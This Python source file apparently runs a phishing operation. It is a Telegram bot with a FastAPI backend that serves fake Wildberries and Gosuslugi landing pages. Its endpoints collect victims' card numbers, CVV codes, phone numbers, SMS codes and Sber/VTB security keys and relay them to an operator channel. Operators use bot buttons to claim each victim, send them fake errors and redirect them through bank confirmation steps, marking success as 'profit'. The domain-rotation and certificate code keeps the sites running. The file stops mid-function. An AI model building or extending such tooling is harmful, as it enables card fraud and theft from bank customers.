#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Multi-Site Bot — Управление несколькими лендингами через Telegram
Wildberries + Госуслуги ЖКХ
"""

import asyncio
import logging
import datetime
import json
import os
import subprocess
from contextlib import asynccontextmanager

from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.session.aiohttp import AiohttpSession

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import uvicorn

from config import (
    BOT_TOKEN, ADMIN_CHANNEL, PROXY_URL, API_HOST, API_PORT,
    FIRST_ERRORS, CODE_ERRORS
)
from database import init_db, Log, Code, Password, Ad
from utils import (
    get_bank_by_bin, get_device_info, mask_card,
    format_log_message, format_taken_log_message, format_repeat_log_message, format_code_message,
    get_new_log_keyboard, get_repeat_log_keyboard, get_code_keyboard, 
    get_password_keyboard, get_taken_keyboard, get_error_keyboard
)

# ============================================
# ЛОГИРОВАНИЕ
# ============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# AIOGRAM БОТ (инициализация отложена до async контекста)
# ============================================
bot: Bot = None
dp = Dispatcher(storage=MemoryStorage())
router = Router()

# ============================================
# FSM СОСТОЯНИЯ
# ============================================
class BotStates(StatesGroup):
    waiting_link = State()
    waiting_domain = State()

def init_bot():
    """Инициализация бота (вызывается в async контексте)"""
    global bot
    session = AiohttpSession(proxy=PROXY_URL)
    bot = Bot(token=BOT_TOKEN, session=session, default=DefaultBotProperties(parse_mode="HTML"))

# ============================================
# FASTAPI
# ============================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    init_bot()
    await init_db()
    logger.info("✅ База данных инициализирована")
    
    # Запускаем бота в фоне
    asyncio.create_task(start_bot())
    logger.info("✅ Telegram бот запущен")
    
    try:
        await bot.send_message(ADMIN_CHANNEL, "🤖 Бот запущен!")
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение о старте: {e}")
    
    yield
    
    # Shutdown
    await bot.session.close()

app = FastAPI(docs_url=None, lifespan=lifespan)

# Статические файлы и шаблоны (будут позже)
# app.mount("/static", StaticFiles(directory="../static"), name="static")
# templates = Jinja2Templates(directory="../templates")

# ============================================
# КОНФИГУРАЦИЯ САЙТОВ
# ============================================

SITES = {
    "wb": {
        "name": "Wildberries",
        "emoji": "💜",
        "root": "/var/www/site",
        "type": "static",
        "proxy_port": 5000,
        "index": "index_sber.html",
        "has_gift_link": True,
        "default_domain": "valentine-sale.digital",
        "nginx_conf": "/etc/nginx/sites-enabled/site_wb.conf",
    },
    "gos": {
        "name": "Госуслуги ЖКХ",
        "emoji": "🏛️",
        "root": "/var/www/gosuslugi",
        "type": "django",
        "proxy_port": 8000,
        "static_root": "/var/www/gosuslugi/staticfiles",
        "has_gift_link": True,
        "gift_link_label": "📋 Ссылка заявки",
        "default_domain": "",
        "nginx_conf": "/etc/nginx/sites-enabled/site_gos.conf",
    },
}

# ============================================
# НАСТРОЙКИ (JSON файл)
# ============================================
SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "data", "settings.json")

def load_settings() -> dict:
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_settings(settings: dict):
    os.makedirs(os.path.dirname(SETTINGS_FILE), exist_ok=True)
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, ensure_ascii=False, indent=2)

def get_site_setting(site_id: str, key: str, default="") -> str:
    settings = load_settings()
    return settings.get("sites", {}).get(site_id, {}).get(key, default)

def set_site_setting(site_id: str, key: str, value: str):
    settings = load_settings()
    if "sites" not in settings:
        settings["sites"] = {}
    if site_id not in settings["sites"]:
        settings["sites"][site_id] = {}
    settings["sites"][site_id][key] = value
    save_settings(settings)

def get_site_domain(site_id: str) -> str:
    return get_site_setting(site_id, "domain", SITES[site_id]["default_domain"])

def set_site_domain(site_id: str, domain: str):
    set_site_setting(site_id, "domain", domain)

def get_gift_link(site_id: str = "wb") -> str:
    """Ссылка подарка/заявки для сайта"""
    return get_site_setting(site_id, "gift_link", "")

def set_gift_link(site_id: str, link: str):
    set_site_setting(site_id, "gift_link", link)

# ============================================
# NGINX КОНФИГУРАЦИЯ
# ============================================

NGINX_STATIC_TEMPLATE = """server {{
    server_name {domain} www.{domain};

    root {root};
    index {index} index.html;

    location /api/ {{
        proxy_pass http://127.0.0.1:{proxy_port}/api/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }}

    location / {{
        try_files $uri $uri/ =404;
    }}

    listen 80;
}}
"""

NGINX_DJANGO_TEMPLATE = """server {{
    server_name {domain} www.{domain};

    location /static/ {{
        alias {static_root}/;
    }}

    location /api/ {{
        proxy_pass http://127.0.0.1:5000/api/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }}

    location / {{
        proxy_pass http://127.0.0.1:{proxy_port};
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }}

    listen 80;
}}
"""

def generate_nginx_config(site_id: str, domain: str) -> str:
    """Генерация nginx конфига для сайта"""
    site = SITES[site_id]
    if site["type"] == "static":
        return NGINX_STATIC_TEMPLATE.format(
            domain=domain,
            root=site["root"],
            index=site.get("index", "index.html"),
            proxy_port=site["proxy_port"],
        )
    elif site["type"] == "django":
        return NGINX_DJANGO_TEMPLATE.format(
            domain=domain,
            static_root=site.get("static_root", site["root"] + "/staticfiles"),
            proxy_port=site["proxy_port"],
        )
    return ""

async def change_site_domain(site_id: str, new_domain: str) -> tuple[str, bool]:
    """Сменить домен сайта: обновить nginx + получить SSL."""
    site = SITES[site_id]
    steps = []

    # 1. Генерируем и записываем nginx конфиг
    try:
        config = generate_nginx_config(site_id, new_domain)
        conf_path = site["nginx_conf"]
        with open(conf_path, "w") as f:
            f.write(config)
        steps.append("✅ Nginx конфиг обновлён")
    except Exception as e:
        return f"❌ Ошибка записи nginx конфига: {e}", False

    # 2. Удаляем default если есть (избежать конфликтов)
    default_path = "/etc/nginx/sites-enabled/default"
    if os.path.exists(default_path):
        try:
            os.remove(default_path)
            steps.append("✅ Удалён старый default конфиг")
        except Exception:
            pass

    # 3. Проверяем nginx
    result = subprocess.run(["nginx", "-t"], capture_output=True, text=True)
    if result.returncode != 0:
        steps.append(f"❌ Ошибка nginx -t: {result.stderr}")
        return "\n".join(steps), False
    steps.append("✅ Nginx конфиг валидный")

    # 4. Перезагружаем nginx
    result = subprocess.run(["systemctl", "reload", "nginx"], capture_output=True, text=True)
    if result.returncode != 0:
        steps.append(f"❌ Ошибка reload nginx: {result.stderr}")
        return "\n".join(steps), False
    steps.append("✅ Nginx перезагружен")

    # 5. Сохраняем домен
    set_site_domain(site_id, new_domain)
    steps.append(f"✅ Домен сохранён: {new_domain}")

    # 6. Получаем SSL
    ssl_ok = await issue_ssl(new_domain)
    if ssl_ok:
        steps.append("✅ SSL сертификат установлен")
        subprocess.run(["systemctl", "reload", "nginx"], capture_output=True, text=True)
        steps.append("✅ Nginx перезагружен с SSL")
    else:
        steps.append("❌ SSL не установлен — DNS ещё не перенеслись?")
        steps.append("Нажмите кнопку ниже когда DNS обновятся.")

    return "\n".join(steps), ssl_ok

async def issue_ssl(domain: str) -> bool:
    """Попытка получить SSL сертификат."""
    try:
        result = subprocess.run([
            "certbot", "--nginx",
            "-d", domain, "-d", f"www.{domain}",
            "--non-interactive", "--agree-tos",
            "--redirect", "--register-unsafely-without-email"
        ], capture_output=True, text=True, timeout=120)
        if result.returncode == 0:
            return True

        result2 = subprocess.run([
            "certbot", "--nginx",
            "-d", domain,
            "--non-interactive", "--agree-tos",
            "--redirect", "--register-unsafely-without-email"
        ], capture_output=True, text=True, timeout=120)
        return result2.returncode == 0
    except Exception as e:
        logger.error(f"SSL error: {e}")
        return False

# ============================================
# КЛАВИАТУРЫ МЕНЮ
# ============================================

def get_main_menu():
    """Главное меню — выбор сайта"""
    buttons = []
    for sid, site in SITES.items():
        domain = get_site_domain(sid)
        label = f"{site['emoji']} {site['name']}"
        if domain:
            label += f"  ({domain})"
        buttons.append([types.InlineKeyboardButton(text=label, callback_data=f"site:{sid}")])
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

def get_site_menu(site_id: str):
    """Меню конкретного сайта"""
    site = SITES[site_id]
    buttons = [
        [types.InlineKeyboardButton(text="🌐 Домен", callback_data=f"domain:{site_id}")],
    ]
    if site.get("has_gift_link"):
        link_label = site.get("gift_link_label", "🎁 Ссылка подарка")
        buttons.insert(0, [types.InlineKeyboardButton(text=link_label, callback_data=f"link:{site_id}")])
    buttons.append([types.InlineKeyboardButton(text="🔒 SSL", callback_data=f"ssl:{site_id}")])
    buttons.append([types.InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:main")])
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

def get_domain_actions(site_id: str):
    """Кнопки для управления доменом"""
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="✏️ Изменить домен", callback_data=f"setdomain:{site_id}")],
        [types.InlineKeyboardButton(text="🔒 Повторить SSL", callback_data=f"retryssl:{site_id}")],
        [types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"site:{site_id}")],
    ])

def get_link_actions(site_id: str):
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="✏️ Изменить ссылку", callback_data=f"setlink:{site_id}")],
        [types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"site:{site_id}")],
    ])

def get_retry_ssl_menu(site_id: str):
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔄 Повторить SSL", callback_data=f"retryssl:{site_id}")],
        [types.InlineKeyboardButton(text="⬅️ Главное меню", callback_data="menu:main")],
    ])

def get_cancel_menu():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="❌ Отмена", callback_data="menu:main")],
    ])

def site_info_text(site_id: str) -> str:
    """Текст с информацией о сайте"""
    site = SITES[site_id]
    domain = get_site_domain(site_id)
    lines = [f"{site['emoji']} <b>{site['name']}</b>\n"]
    lines.append(f"🌐 Домен: <code>{domain or 'не установлен'}</code>")
    if domain:
        lines.append(f"🔗 https://{domain}/")
    if site.get("has_gift_link"):
        link = get_gift_link(site_id)
        lines.append(f"🔗 Ссылка: <code>{link or 'не установлена'}</code>")
    lines.append(f"⚙️ Тип: {site['type']}, порт {site['proxy_port']}")
    return "\n".join(lines)

# ============================================
# TELEGRAM ОБРАБОТЧИКИ
# ============================================

@router.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    text = "🤖 <b>Управление сайтами</b>\n\n"
    for sid, site in SITES.items():
        domain = get_site_domain(sid)
        text += f"{site['emoji']} {site['name']}: <code>{domain or '—'}</code>\n"
    text += "\nВыберите сайт для управления:"
    await message.answer(text, reply_markup=get_main_menu())

# --- ГЛАВНОЕ МЕНЮ ---

@router.callback_query(F.data == "menu:main")
async def menu_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    text = "🤖 <b>Управление сайтами</b>\n\n"
    for sid, site in SITES.items():
        domain = get_site_domain(sid)
        text += f"{site['emoji']} {site['name']}: <code>{domain or '—'}</code>\n"
    text += "\nВыберите сайт для управления:"
    await callback.message.edit_text(text, reply_markup=get_main_menu())
    await callback.answer()

# --- МЕНЮ САЙТА ---

@router.callback_query(F.data.startswith("site:"))
async def menu_site(callback: types.CallbackQuery):
    site_id = callback.data.split(":")[1]
    if site_id not in SITES:
        await callback.answer("❌ Сайт не найден", show_alert=True)
        return
    await callback.message.edit_text(
        site_info_text(site_id),
        reply_markup=get_site_menu(site_id)
    )
    await callback.answer()

# --- ДОМЕН ---

@router.callback_query(F.data.startswith("domain:"))
async def menu_domain(callback: types.CallbackQuery):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    domain = get_site_domain(site_id)
    text = f"{site['emoji']} <b>{site['name']} — Домен</b>\n\n"
    if domain:
        text += f"Текущий: <code>{domain}</code>\nСайт: https://{domain}/"
    else:
        text += "⚠️ Домен не установлен"
    await callback.message.edit_text(text, reply_markup=get_domain_actions(site_id))
    await callback.answer()

# --- ССЫЛКА ПОДАРКА ---

@router.callback_query(F.data.startswith("link:"))
async def menu_link(callback: types.CallbackQuery):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    link = get_gift_link(site_id)
    link_label = site.get("gift_link_label", "🎁 Ссылка подарка")
    text = f"{site['emoji']} <b>{site['name']} — {link_label}</b>\n\n"
    if link:
        text += f"Текущая: <code>{link}</code>"
    else:
        text += "⚠️ Не установлена"
    await callback.message.edit_text(text, reply_markup=get_link_actions(site_id))
    await callback.answer()

# --- SSL ---

@router.callback_query(F.data.startswith("ssl:"))
async def menu_ssl(callback: types.CallbackQuery):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    domain = get_site_domain(site_id)
    if not domain:
        await callback.answer("⚠️ Сначала установите домен!", show_alert=True)
        return
    await callback.message.edit_text(
        f"{site['emoji']} <b>{site['name']} — SSL</b>\n\n"
        f"Домен: <code>{domain}</code>\n\n"
        f"Нажмите кнопку чтобы выпустить/обновить SSL сертификат:",
        reply_markup=get_retry_ssl_menu(site_id)
    )
    await callback.answer()

# --- ДЕЙСТВИЯ: УСТАНОВИТЬ ДОМЕН ---

@router.callback_query(F.data.startswith("setdomain:"))
async def action_setdomain(callback: types.CallbackQuery, state: FSMContext):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    await state.set_state(BotStates.waiting_domain)
    await state.update_data(site_id=site_id)
    await callback.message.edit_text(
        f"{site['emoji']} <b>{site['name']} — Новый домен</b>\n\n"
        "Отправьте домен, например: <code>mysite.com</code>\n\n"
        "⚠️ DNS домена должен быть направлен на IP сервера!",
        reply_markup=get_cancel_menu()
    )
    await callback.answer()

# --- ДЕЙСТВИЯ: УСТАНОВИТЬ ССЫЛКУ ---

@router.callback_query(F.data.startswith("setlink:"))
async def action_setlink(callback: types.CallbackQuery, state: FSMContext):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    await state.set_state(BotStates.waiting_link)
    await state.update_data(site_id=site_id)
    await callback.message.edit_text(
        f"{site['emoji']} <b>{site['name']} — Новая ссылка</b>\n\n"
        "Отправьте ссылку:\n<code>https://example.com/path</code>",
        reply_markup=get_cancel_menu()
    )
    await callback.answer()

# --- ДЕЙСТВИЯ: ПОВТОРИТЬ SSL ---

@router.callback_query(F.data.startswith("retryssl:"))
async def action_retry_ssl(callback: types.CallbackQuery):
    site_id = callback.data.split(":")[1]
    site = SITES[site_id]
    domain = get_site_domain(site_id)
    if not domain:
        await callback.answer("⚠️ Домен не установлен!", show_alert=True)
        return

    await callback.message.edit_text(
        f"🔄 <b>Получаю SSL для</b> <code>{domain}</code>...\n\n"
        f"⏳ Подождите, это может занять до 2 минут..."
    )
    await callback.answer()

    ssl_ok = await issue_ssl(domain)

    if ssl_ok:
        subprocess.run(["systemctl", "reload", "nginx"], capture_output=True, text=True)
        await callback.message.edit_text(
            f"{site['emoji']} <b>SSL для {site['name']}</b>\n\n"
            f"✅ SSL сертификат успешно установлен!\n"
            f"✅ Nginx перезагружен\n\n"
            f"🌐 Сайт: https://{domain}/",
            reply_markup=get_site_menu(site_id)
        )
        logger.info(f"SSL issued for {site_id}: {domain}")
    else:
        await callback.message.edit_text(
            f"{site['emoji']} <b>SSL для {site['name']}</b>\n\n"
            f"❌ SSL не удалось установить\n\n"
            f"Возможные причины:\n"
            f"• DNS ещё не обновились (5-30 мин)\n"
            f"• A-запись не указывает на IP сервера\n\n"
            f"Попробуйте позже 👇",
            reply_markup=get_retry_ssl_menu(site_id)
        )
        logger.warning(f"SSL failed for {site_id}: {domain}")

# --- ОБРАБОТКА ВВОДА ---

@router.message(BotStates.waiting_link)
async def process_link(message: types.Message, state: FSMContext):
    data = await state.get_data()
    site_id = data.get("site_id", "wb")
    link = message.text.strip()
    set_gift_link(site_id, link)
    await state.clear()
    site = SITES[site_id]
    await message.answer(
        f"✅ Ссылка установлена для {site['emoji']} {site['name']}:\n<code>{link}</code>",
        reply_markup=get_site_menu(site_id)
    )
    logger.info(f"Gift link updated for {site_id}: {link}")

@router.message(BotStates.waiting_domain)
async def process_domain(message: types.Message, state: FSMContext):
    data = await state.get_data()
    site_id = data.get("site_id", "wb")
    site = SITES[site_id]

    new_domain = message.text.strip().lower()
    new_domain = new_domain.replace("https://", "").replace("http://", "").replace("www.", "").rstrip("/")
    old_domain = get_site_domain(site_id)

    msg = await message.answer(
        f"⏳ {site['emoji']} Меняю домен {site['name']}...\n"
        f"<code>{old_domain or '—'}</code> → <code>{new_domain}</code>"
    )

    result, ssl_ok = await change_site_domain(site_id, new_domain)
    await state.clear()

    reply_markup = get_site_menu(site_id) if ssl_ok else get_retry_ssl_menu(site_id)
    await msg.edit_text(
        f"{site['emoji']} <b>{site['name']}</b>\n"
        f"<code>{old_domain or '—'}</code> → <code>{new_domain}</code>\n\n{result}",
        reply_markup=reply_markup
    )
    logger.info(f"Domain changed {site_id}: {old_domain} -> {new_domain}, SSL: {ssl_ok}")

@router.callback_query(F.data == "_")
async def empty_callback(callback: types.CallbackQuery):
    await callback.answer()

# --- ВЗЯТЬ ЛОГ ---
@router.callback_query(F.data.startswith("take_log:"))
async def take_log(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    if log.status != "waiting":
        await callback.answer("❌ Лог уже взят!", show_alert=True)
        return
    
    # Берём лог
    handler_name = callback.from_user.username or callback.from_user.first_name
    await log.take(callback.from_user.id, handler_name)
    
    # Обновляем сообщение
    await callback.message.edit_text(
        format_taken_log_message(log),
        reply_markup=get_taken_keyboard(log.id)
    )
    
    await callback.answer("✅ Лог взят!")
    logger.info(f"Лог #{log.id} взят пользователем @{handler_name}")

# --- ОШИБКИ ПЕРВИЧНЫЕ ---
@router.callback_query(F.data.startswith("first_error:"))
async def first_error(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    log_id = int(parts[2])
    
    log = await Log.get_by_id(log_id)
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    errors = list(FIRST_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = FIRST_ERRORS[error_key]
    
    await log.update_status("error", error_text)
    
    await callback.message.edit_reply_markup(reply_markup=get_error_keyboard(error_key))
    await callback.answer(f"Отправлена ошибка: {error_key}")
    logger.info(f"Лог #{log.id} - ошибка: {error_key}")

# --- РЕДИРЕКТ НА КОД ---
@router.callback_query(F.data.startswith("redirect_to_code:"))
async def redirect_to_code(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    await log.update_status("taken")
    
    await callback.message.edit_reply_markup(
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="🤝 ОТПРАВЛЕН НА КОД", callback_data="_")]
        ])
    )
    
    await callback.answer("✅ Клиент отправлен на код")

# --- ОШИБКИ КОДА ---
@router.callback_query(F.data.startswith("code_error:"))
async def code_error(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    code_id = int(parts[2])
    
    code = await Code.get_by_id(code_id)
    if not code:
        await callback.answer("❌ Код не найден", show_alert=True)
        return
    
    log = await code.get_log()
    
    errors = list(CODE_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = CODE_ERRORS[error_key]
    
    await code.update_status(error_text)
    
    if "Неверный код" in error_key:
        log.block_code_input = True
        await log.save()
    
    await callback.message.edit_reply_markup(reply_markup=get_error_keyboard(error_key))
    await callback.answer(f"Отправлена ошибка")
    logger.info(f"Код #{code.id} - ошибка: {error_key}")

# --- КЛЮЧ БЕЗОПАСНОСТИ ---
@router.callback_query(F.data.startswith("security_key:"))
async def security_key(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    bank_type = parts[1]  # sber или vtb
    code_id = int(parts[2])
    
    code = await Code.get_by_id(code_id)
    if not code:
        await callback.answer("❌ Код не найден", show_alert=True)
        return
    
    key_type = "SECURITY_KEY" if bank_type == "sber" else "SECURITY_KEY_VTB"
    await code.update_status(key_type)
    
    bank_name = "Сбер 🟩" if bank_type == "sber" else "ВТБ 🟦"
    
    await callback.message.edit_reply_markup(
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text=f"🔑 Редирект на ключ ({bank_name})", callback_data="_")]
        ])
    )
    
    await callback.answer(f"✅ Редирект на ключ {bank_name}")

# --- УСПЕХ ---
@router.callback_query(F.data.startswith("success:"))
async def success_log(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    await log.update_status("success")
    
    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>УСПЕШНО ЗАВЕРШЕНО</b>",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="✅ ПРОФИТ ✅", callback_data="_")]
        ])
    )
    
    await callback.answer("✅ Успех!")
    logger.info(f"Лог #{log.id} - УСПЕХ!")

# --- ОБРАБОТКА ПАРОЛЯ ---
@router.callback_query(F.data.startswith("password:"))
async def password_action(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    action = parts[1]
    password_id = int(parts[2])
    
    password = await Password.get_by_id(password_id)
    if not password:
        await callback.answer("❌ Не найдено", show_alert=True)
        return
    
    code = await Code.get_by_id(password.code_id)
    
    if action == "BAD":
        await password.update_status("BAD_PASSWORD")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="❌ Неверный ключ", callback_data="_")]
            ])
        )
    elif action == "CODE":
        await password.update_status("RETURN_TO_CODE")
        await code.update_status("RETURN_TO_CODE")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="📟 Возврат на код", callback_data="_")]
            ])
        )
    elif action == "BACK":
        await password.update_status("RETURN_TO_CARD")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="⬅️ Возврат на карту", callback_data="_")]
            ])
        )
    elif action == "OK":
        await password.update_status("SUCCESS")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="✅ Подтверждено", callback_data="_")]
            ])
        )
    
    await callback.answer()

# Регистрация роутера
dp.include_router(router)

async def start_bot():
    """Запуск Telegram бота"""
    await dp.start_polling(bot)

# ============================================
# API ENDPOINTS
# ============================================

@app.get("/api/health")
async def health():
    return {"status": "ok", "time": datetime.datetime.now().isoformat()}

@app.get("/api/gift-link")
async def api_gift_link():
    """Получение текущей ссылки подарка (Wildberries)"""
    link = get_gift_link("wb")
    return {"link": link}

@app.get("/api/claim-link")
async def api_claim_link():
    """Получение текущей ссылки заявки (Госуслуги)"""
    link = get_gift_link("gos")
    return {"link": link}

@app.post("/api/createLog")
async def create_log(request: Request):
    """Создание нового лога карты"""
    body = await request.json()
    user_agent = request.headers.get("User-Agent", "")
    
    card = body.get("number", "").replace(" ", "")
    phone = body.get("phone_num", "")
    expire = body.get("expire", "-")
    cvv = body.get("cvv", "-")
    balance = body.get("balance", "")
    ad_id = body.get("adId")
    
    # Определяем банк
    bank = await get_bank_by_bin(card)
    device = get_device_info(user_agent)
    
    # Проверяем существующий лог по карте
    old_log = await Log.get_by_card(card)
    
    if old_log and old_log.handler_id:
        # Повторный переход
        log = Log(
            card_number=card,
            card_expiry=expire,
            cvv=cvv,
            phone=phone,
            balance=balance,
            bank=bank,
            device=device,
            ad_id=ad_id,
            handler_id=old_log.handler_id,
            handler_name=old_log.handler_name,
            status="taken",
            topic="🔄 | ПОВТОРНЫЙ ПЕРЕХОД"
        )
        await log.save()
        
        # Отправляем в Telegram
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_repeat_log_message(log),
                reply_markup=get_repeat_log_keyboard(log.id),
                reply_to_message_id=old_log.message_id
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка отправки в Telegram: {e}")
        
        return {"token": log.id}
    
    else:
        # Новый лог
        log = Log(
            card_number=card,
            card_expiry=expire,
            cvv=cvv,
            phone=phone,
            balance=balance,
            bank=bank,
            device=device,
            ad_id=ad_id,
            status="waiting",
            topic="🟧 | Лог карты"
        )
        await log.save()
        
        # Отправляем в Telegram
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_log_message(log),
                reply_markup=get_new_log_keyboard(log.id)
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка отправки в Telegram: {e}")
        
        return {"token": log.id}

@app.post("/api/log/status")
async def check_log_status(request: Request):
    """Проверка статуса лога"""
    body = await request.json()
    log_id = body.get("logId")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return {"status": None}
    
    return {
        "status": log.status if log.status != "waiting" else None,
        "error": log.error_text,
        "question_text": log.question_text
    }

@app.post("/api/send/code")
async def send_code(request: Request):
    """Отправка СМС кода"""
    body = await request.json()
    log_id = body.get("logId")
    code_value = body.get("code")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return {"error": "Log not found"}
    
    # Создаём код
    code = Code(log_id=log.id, code=code_value)
    await code.save()
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            format_code_message(log, code_value),
            reply_markup=get_code_keyboard(code.id, log.id),
            reply_to_message_id=log.message_id
        )
        await code.update_message_id(msg.message_id)
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
    
    return {"code_id": code.id}

@app.post("/api/check/code")
async def check_code_status(request: Request):
    """Проверка статуса кода"""
    body = await request.json()
    code_id = body.get("codeId")
    
    code = await Code.get_by_id(code_id)
    if not code:
        return {"statusLog": None}
    
    return {"statusLog": code.status}

@app.post("/api/security/password")
async def send_password(request: Request):
    """Отправка ключа безопасности"""
    body = await request.json()
    code_id = body.get("code_id")
    password_value = body.get("password")
    
    code = await Code.get_by_id(code_id)
    if not code:
        return {"error": "Code not found"}
    
    log = await code.get_log()
    
    # Создаём пароль
    password = Password(code_id=code.id, password=password_value)
    await password.save()
    
    # Определяем тип ключа
    key_type = "(Сбер 🟩)" if code.status == "SECURITY_KEY" else "(ВТБ 🟦)"
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            f"<b>🔑 | Ключ безопасности {key_type}</b>\n\n<b>Ключ:</b> <code>{password_value}</code>",
            reply_markup=get_password_keyboard(password.id),
            reply_to_message_id=code.message_id
        )
        password.message_id = msg.message_id
        await password.save()
    except Exception as e:
        logger.error(f"Ошибка отправки пароля: {e}")
    
    return {"password_id": password.id}

@app.post("/api/security/check")
async def check_password_status(request: Request):
    """Проверка статуса пароля"""
    body = await request.json()
    password_id = body.get("password_id")
    
    password = await Password.get_by_id(password_id)
    if not password:
        return {"status": None}
    
    return {"status": password.status}

@app.post("/api/updateOnline")
async def update_online(request: Request):
    """Обновление онлайн статуса"""
    body = await request.json()
    ad_id = body.get("id")
    
    if ad_id:
        ad = await Ad.get_by_id(ad_id)
        if ad:
            await ad.update_online()
    
    return {"ok": True}

# ============================================
# ПРОСТЫЕ СТРАНИЦЫ (API для фронтенда)
# ============================================

@app.get("/api/log/{log_id}/status")
async def get_log_status(log_id: int):
    """GET версия проверки статуса"""
    log = await Log.get_by_id(log_id)
    if not log:
        return JSONResponse({"error": "Not found"}, status_code=404)
    
    return {
        "status": log.status,
        "error": log.error_text,
        "card_last4": log.card_number[-4:] if log.card_number else None
    }

@app.post("/api/log/{log_id}/code")
async def post_code(log_id: int, request: Request):
    """Отправка кода (простой API)"""
    body = await request.json()
    code_value = body.get("code")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return JSONResponse({"error": "Not found"}, status_code=404)
    
    # Создаём код
    code = Code(log_id=log.id, code=code_value)
    await code.save()
    
    log.status = "code_received"
    await log.save()
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            format_code_message(log, code_value),
            reply_markup=get_code_keyboard(code.id, log.id),
            reply_to_message_id=log.message_id
        )
        await code.update_message_id(msg.message_id)
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
    
    return {"success": True, "code_id": code.id}

@app.post("/api/log")
async def create_simple_log(request: Request):
    """Простое создание лога (для receive.html)"""
    body = await request.json()
    user_agent = request.headers.get("User-Agent", "")
    
    card = body.get("card", "").replace(" ", "")
    phone = body.get("phone", "")
    
    bank = await get_bank_by_bin(card)
    device = get_device_info(user_agent)
    
    # Проверяем существующий лог
    old_log = await Log.get_by_card(card)
    
    if old_log and old_log.handler_id:
        # Повторный переход
        log = Log(
            card_number=card,
